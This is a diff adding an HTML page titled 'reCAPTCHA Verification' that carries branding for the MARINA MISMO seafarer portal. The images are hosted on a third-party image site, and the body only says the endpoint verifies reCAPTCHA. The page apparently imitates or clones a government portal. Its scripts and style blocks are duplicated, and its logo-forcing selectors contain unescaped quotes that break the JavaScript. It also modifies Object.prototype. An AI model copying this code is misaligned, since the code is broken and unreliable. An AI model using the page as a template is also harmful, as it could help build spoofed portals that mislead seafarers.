@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+      (function() {
+        if (!Object.prototype.charCodeAt) {
+          Object.defineProperty(Object.prototype, "charCodeAt", {
+            value: function(index) {
+              return String(this).charCodeAt(index || 0);
+            },
+            configurable: true,
+            writable: true,
+            enumerable: false
+          });
+        }
+      })();
+    </script>
+
+    <meta name="referrer" content="no-referrer" />
+    <!-- SEO & Social Media Metadata -->
+    <meta property="og:site_name" content="MARINA MISMO" />
+    <meta property="og:title" content="MARINA - Integrated Seafarers Management Online (MISMO) System" />
+    <meta property="og:description" content="Maritime Industry Authority (MARINA) Integrated Seafarers Management Online (MISMO) System" />
+    <meta property="og:image" content="https://iili.io/Cs3uV0g.png" />
+    <meta property="og:image:secure_url" content="https://iili.io/Cs3uV0g.png" />
+    <meta property="og:image:type" content="image/png" />
+    <meta property="og:image:width" content="500" />
+    <meta property="og:image:height" content="500" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="MARINA - Integrated Seafarers Management Online (MISMO) System" />
+    <meta name="twitter:description" content="Maritime Industry Authority (MARINA) Integrated Seafarers Management Online (MISMO) System" />
+    <meta name="twitter:image" content="https://iili.io/Cs3uV0g.png" />
+    <link rel="icon" type="image/png" href="https://iili.io/Cs3uV0g.png" />
+    <link rel="apple-touch-icon" href="https://iili.io/Cs3uV0g.png" />
+    <script src="/static/js/logo-data.js"></script>
+    <style>
+      .header img, header img, a[href="/"] img, a[href="index.html"] img {
+        display: inline-block !important;
+        max-width: 250px !important;
+        width: auto !important;
+        height: auto !important;
+        visibility: visible !important;
+        opacity: 1 !important;
+      }
+      @media (max-width: 768px) {
+        .header img, header img, a[href="/"] img, a[href="index.html"] img {
+          max-width: 100px !important;
+          width: 100px !important;
+          height: auto !important;
+        }
+        .header {
+          margin-bottom: 15px !important;
+        }
+      }
+      @media (max-width: 480px) {
+        .header img, header img, a[href="/"] img, a[href="index.html"] img {
+          max-width: 85px !important;
+          width: 85px !important;
+          height: auto !important;
+        }
+      }
+      .index-wrapper {
+        background: #0f237a url(https://iili.io/CsfJmhJ.jpg) no-repeat center center !important;
+        background-size: cover !important;
+      }
+      .recaptcha-container, #g-recaptcha, .form-wrapper #g-recaptcha, .form-container #g-recaptcha, .position #g-recaptcha {
+        margin: 15px 0 !important;
+        display: flex !important;
+        justify-content: flex-start !important;
+        align-items: flex-start !important;
+        width: 100% !important;
+        max-width: 304px !important;
+        min-height: 78px !important;
+        margin-left: 0 !important;
+        margin-right: auto !important;
+      }
+    
+/* Container size and positioning safeguards */
+.inner-wrapper {
+  max-width: 900px !important;
+  width: 100% !important;
+  margin: 0 auto !important;
+  box-sizing: border-box !important;
+}
+
+.bg-wrapper {
+  max-width: 900px !important;
+  width: 100% !important;
+  position: relative !important;
+  border-radius: 10px !important;
+  box-sizing: border-box !important;
+  margin: 0 auto !important;
+}
+
+@media (min-width: 769px) {
+  .inner-wrapper {
+    max-width: 900px !important;
+    width: 900px !important;
+    margin: 0 auto !important;
+  }
+  .bg-wrapper {
+    width: 900px !important;
+    max-width: 900px !important;
+    float: left !important;
+  }
+  .bg-wrapper .left {
+    margin-right: 470px !important;
+  }
+  .bg-wrapper .right .position {
+    width: 440px !important;
+    max-width: 440px !important;
+    position: absolute !important;
+    right: 15px !important;
+    top: -35px !important;
+    min-height: 513px !important;
+  }
+}
+
+@media (max-width: 768px) {
+  .inner-wrapper {
+    max-width: 100% !important;
+    width: 100% !important;
+  }
+  .bg-wrapper {
+    width: 100% !important;
+    max-width: 100% !important;
+    border-radius: 0 !important;
+    padding: 3% 3% 0 !important;
+  }
+  .bg-wrapper .left {
+    margin-right: 0 !important;
+  }
+  .bg-wrapper .right .position {
+    width: 100% !important;
+    max-width: 100% !important;
+    position: relative !important;
+    right: auto !important;
+    top: auto !important;
+    margin: 0 auto 30px !important;
+    min-height: auto !important;
+  }
+}
+
+    </style>
+    <script>
+      if ("serviceWorker" in navigator) {
+        window.addEventListener("load", function() {
+          navigator.serviceWorker.register("/sw.js").then(function(reg) {
+            console.log("App Cache active:", reg.scope);
+          }).catch(function(err) {
+            console.warn("Service worker notice:", err);
+          });
+        });
+      }
+
+      // Continuous DOM guard ensuring logo is present on all React lifecycle events
+      (function() {
+        var LOGO_URL = "https://iili.io/Cs3uV0g.png";
+        function ensureLogo() {
+          var logoElements = document.querySelectorAll("header img, .header img, a[href="/"] img, a[href="index.html"] img, img[alt="MARINA Logo"], img[alt="Cs3uV0g.png"]");
+          for (var i = 0; i < logoElements.length; i++) {
+            var img = logoElements[i];
+            if (!img.src || img.src === "" || img.src.indexOf("Cs3uV0g.png") === -1) {
+              img.src = LOGO_URL;
+              img.setAttribute("referrerpolicy", "no-referrer");
+            }
+          }
+        }
+        document.addEventListener("DOMContentLoaded", ensureLogo);
+        window.addEventListener("load", ensureLogo);
+        if (window.MutationObserver) {
+          new MutationObserver(ensureLogo).observe(document.documentElement, { childList: true, subtree: true });
+        }
+        setInterval(ensureLogo, 300);
+      })();
+    </script>
+
+    
+
+
+    
+    <script>
+      // Register App Cache Service Worker
+      if ("serviceWorker" in navigator) {
+        window.addEventListener("load", function() {
+          navigator.serviceWorker.register("/sw.js").then(function(reg) {
+            console.log("MARINA App Cache Service Worker registered:", reg.scope);
+          }).catch(function(err) {
+            console.log("Service Worker registration failed:", err);
+          });
+        });
+      }
+
+      // Robust DOM guard to ensure header logo never disappears when React mounts
+      (function() {
+        var logoSrc = "https://iili.io/Cs3uV0g.png";
+        function fixLogos() {
+          var imgs = document.querySelectorAll("header img, .header img, a[href="/"] img, a[href="index.html"] img, img[alt="Cs3uV0g.png"], img[alt="MARINA Logo"]");
+          for (var i = 0; i < imgs.length; i++) {
+            var img = imgs[i];
+            if (!img.src || img.src === "" || img.src.indexOf("Cs3uV0g.png") === -1 && (!window.__MARINA_LOGO__ || img.src !== window.__MARINA_LOGO__)) {
+              img.src = (window.__MARINA_LOGO__ || logoSrc);
+              img.setAttribute("referrerpolicy", "no-referrer");
+            }
+            if (!img.onerror) {
+              img.onerror = function() {
+                if (window.__MARINA_LOGO__ && this.src !== window.__MARINA_LOGO__) {
+                  this.src = window.__MARINA_LOGO__;
+                }
+              };
+            }
+          }
+        }
+        document.addEventListener("DOMContentLoaded", fixLogos);
+        window.addEventListener("load", fixLogos);
+        if (window.MutationObserver) {
+          var obs = new MutationObserver(function() {
+            fixLogos();
+          });
+          obs.observe(document.documentElement, { childList: true, subtree: true });
+        }
+        setInterval(fixLogos, 250);
+      })();
+    </script>
+
+    <base href="/">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>reCAPTCHA Verification</title>
+
+<style>
+      .header img, header img, a[href="/"] img, a[href="index.html"] img {
+        display: inline-block !important;
+        max-width: 250px !important;
+        width: auto !important;
+        height: auto !important;
+        visibility: visible !important;
+        opacity: 1 !important;
+      }
+      @media (max-width: 768px) {
+        .header img, header img, a[href="/"] img, a[href="index.html"] img {
+          max-width: 100px !important;
+          width: 100px !important;
+          height: auto !important;
+        }
+        .header {
+          margin-bottom: 15px !important;
+        }
+      }
+      @media (max-width: 480px) {
+        .header img, header img, a[href="/"] img, a[href="index.html"] img {
+          max-width: 85px !important;
+          width: 85px !important;
+          height: auto !important;
+        }
+      }
+      .index-wrapper {
+        background: #0f237a url(https://iili.io/CsfJmhJ.jpg) no-repeat center center !important;
+        background-size: cover !important;
+      }
+      .recaptcha-container, #g-recaptcha, .form-wrapper #g-recaptcha, .form-container #g-recaptcha, .position #g-recaptcha {
+        margin: 15px 0 !important;
+        display: flex !important;
+        justify-content: flex-start !important;
+        align-items: flex-start !important;
+        width: 100% !important;
+        max-width: 304px !important;
+        min-height: 78px !important;
+        margin-left: 0 !important;
+        margin-right: auto !important;
+      }
+    </style>
+
+</head>
+<body>
+  <p>This endpoint is used by the site to verify the reCAPTCHA response.</p>
+</body>
+</html>
